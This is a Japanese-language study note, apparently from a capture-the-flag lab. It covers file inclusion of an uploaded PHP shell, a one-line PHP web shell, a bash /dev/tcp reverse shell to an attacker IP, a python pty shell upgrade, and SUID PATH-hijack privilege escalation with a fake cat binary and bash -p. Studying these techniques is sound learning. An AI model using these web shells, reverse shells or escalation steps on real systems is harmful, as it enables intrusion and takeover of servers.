2025/11/14 6

ファイルインクルード
whoamiで

画像に見せかけたphpコードをuploadし、そのあとindex.php にアクセスするときhttpリクエストのcookie 欄にlang=を追加して、さっきのuploadのパス（＜ｓｒｃ＞）source を追加する。（index.phpのソースコードにそれがある場合はそれをincludeに渡すというものがあるから）
アクセスした結果はHTMLの前にPHPの実行結果が出てくる


ｐｈｐシェルとは
PHPで書かれた「コマンド受け取り装置」
・外からURLを叩くと、そのPHPがサーバーに命令を実行させる
・Webブラウザが「遠隔リモコン」に化ける


<?php echo system($_GET['cmd']); ?>
OSにURLパラメータの波動をそのまま渡して命令させてしまう仕組み。

$_GET['cmd']　URL のクエリ部分を受け取る変数。外部から来た振動を、そのままサーバーの心に届けちゃう箱
system() は OS に直接命令する関数。本質的に危険な理由。
echo 　実行結果をそのまま画面に返す。


ワンラインリバースシェル
/bin/bash -c '/bin/bash -i > /dev/tcp/攻撃端末のIPアドレス/待ち受けポート　0<&1 2>&1'

/bin/bash -c '…'
bash に 中の文字列をコマンドとして実行させる。文字列をそのままコマンドとして実行するモード。
-c "ls" と書いたら、bash は 中の "ls" を実行して終わる。
/bin/bash -i  対話モードのシェルを起動する。（interactive）モード。人間からの入力を前提に待ち受け続ける。
> /dev/tcp/IP/PORT標準出力（stdout）を
指定した IP とポートへ TCP 経由で送る。
0<&1

標準入力（stdin）を
標準出力と同じ場所から受け取るようにする。

>&1

エラー出力（stderr）を
標準出力と同じ流れに統合する。

全部を攻撃者の画面で行うということ

/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
/usr/bin/python Python 実行ファイル。Python を起動する。
-c '…'  Python に“この文字列をコードとして実行しろ”と指示するオプション。
import pty  標準ライブラリ pty を読み込む。pty ＝ 擬似端末（舞台装置）を作ったり操作するためのモジュール　　　　ターミナル（観客、窓口）pty（ターミナル画面の奥にある舞台）bash（踊るキャラクター）
pty.spawn("/bin/bash")  "/bin/bash" を 擬似端末上に生成して実行する。
[Python に擬似端末を使った bash を起動させる]
通常　[ユーザー] → [ターミナル] → [PTY（疑似端末）] → [bash]
Python が pty.spawn() で介入した場合　[ユーザー] → [Python] → [PTY（疑似端末）] → [bash]
ターミナルの代わりに Python が「入出力の窓口」となり、疑似端末を通じて bash を現実化している

spawnの意味
卵を産む、発生させる
古ノルド語　spann小枝→何かを生み出す
古フランス語　espaner 卵を産む
ただ物理的に何かを作るだけじゃなくて潜在的な可能性を呼び出し、そこに現象を生み出すみたいなニュアンスもある

古ノルド語を話していた人たちは、寒冷で森林が豊かな北欧に住んでいた。木は日常生活の中心、火をおこす、住居「生活に密接でよく使うもの」は言語化されやすい
（sp–n）が、「スッと割れる、細くなる」感覚をそのまま反映
小枝や薄片は単なる物質だけど、潜在的には「何かを生み出すきっかけ」でもある
そこから「生み出す・発生させる（spawn）」という抽象的意味が派生
古ノルド語の spánn は、物理世界の「小さな端」から無限の可能性が生まれるイメージを象徴している
言葉自体が、生命や創造のエネルギーのスパークを宿していた

straceコマンド　system call trace プログラムがシステムにお願いする様子を全部見れる


fileコマンド　　file はファイルを開かずに、その中身の先頭のデータ（マジックナンバーとかヘッダ情報）を読んで、「これは何のファイルか？」 を判断
file コマンドは「いやいや、中身はこれだろ？」って正体を指摘する探偵
テキストファイル　ASCII text　　画像ファイル　JPEG image data　実行ファイル　 ELF 64-bit LSB executable　　スクリプトファイル　POSIX shell script　
ELF 64-bit LSB　Executable and Linkable Format　　64-bit　このプログラムは64ビットCPU向け高次元
LSB Least Significant Bit　バイトは小さい方から読む派です
バイトは見た目の大きさ（78）じゃなく、座ってる席で上下が決まる最初に出てくる１２は大事だから大きい位ってこと


引数なしで実行するとは　$ ./my_program　外から何も情報を渡さず、ただプログラムを起動すること
あり　　$ ./my_program hello

ファイルを実行するとは　
そのファイルの中に書かれた命令を順番に動かしてもらうこと

./ は「今いる場所にあるファイルを実行してね」という合図　. は 今いるディレクトリ（場所） を意味する　/ は その中のファイルにアクセスするよ という合図
./ は 「今ここにいるプログラム魂を呼び出す呪文
（ls コマンドは list（リスト）する という意味で、今自分がいるディレクトリ（フォルダ）の中身を一覧で見せてくれる）

ls や pwd、find などのコマンドも 全部ファイル、多くのコマンドは /bin や /usr/bin のディレクトリにある実行ファイル
$ which ls
/bin/ls　　　　ls を呼ぶと /bin/ls というファイルが実行されている　
コマンドは ファイルの魂の別名./ で呼び出すのと同じ仕組み


./msgmike を実行したら、cat: /home/mike/msg.txt : no such a file or directory って出てきたんだけど　./msgmike　これを実行してるのに、msg.txtこれが出てくるのは、あと、cat:はどういう意味スクリプトの中に
cat /home/mike/msg.txt
みたいな行があると、cat が
「ちょっと見てくるわ」 → 「あれ？ないじゃん」
って言ってくる。

“cat: No such file or directory” はどういう状態かcat が msg.txt を探しに行った
でもその場所には msg.txt が存在していなかった
でもこのmsg.txtが存在するかしないかは問題ではない、
重要なのは/msgmikeがsuidファイルであり、この所有者mikeで実行されるということ、スクリプトにはcatコマンドを実行するコマンドがあるということ。
今はkaneユーザー

偽のcatファイルを作って、それをtmpディレクトリで作り、それに実行権限を与えて、これを環境変数の一番最初に置く。偽catファイルの中身はbin.bashつまり、mike権限でbash新しい舞台の演者を出す。
これでmikeのほうに切り替える。

偽 cat ファイルは「bash を起動するただのテキスト/tmp/cat はこういう中身：
/bin/bash　　/tmp/cat を実行→ 中に書かれた /bin/bash が実行される
今いる場所（カレントディレクトリ）が /tmp のとき、
echo "/bin/bash" > cat　としたら、
その“cat”ファイルは /tmp/cat として物質化される。場所（ディレクトリ）＋ 名前（ファイル名）で、その存在の「波動座標」が決まるから。

/bin/bash が mike 権限で開く
＝
mike という役柄で新しい bash（演者）が舞台に立つ
操作：
cd /tmp
echo "/bin/bash" > cat
chmod +x cat　　　　

「suidファイルがあったら、別の権限で動かせるので、（そのファイルの中で実行されるコマンドファイルの中身をbin/bashにして環境設定の一番最初に実行させて）ユーザーを切り替えられる可能性がある」ファイル名が被ってもいいことが大事だね
ファイル名が被ってもいい＝波動をすり替えられる。ファイル名が被るから成立する技術。

「ドルーパレン」とは「Dollar（$）＋Parenthesis（丸括弧）」の略で、つまり $() のこと

$() の中に書いたコマンドを実行して、その結果をその場に差し込む魔法みたいなやつだね。

bash -pコマンドとは
bash -p は “privileged mode” のシェルを起動するオプション。
普通、SUID で起動したプログラムの中でシェルを開くと、セキュリティ上、権限を下げてしまうことがある。
でも -p を付けると、SUID のままの権限を保持してシェルを開ける。

これをrootが実行する→ルートユーザーのシェルが動くようになる。

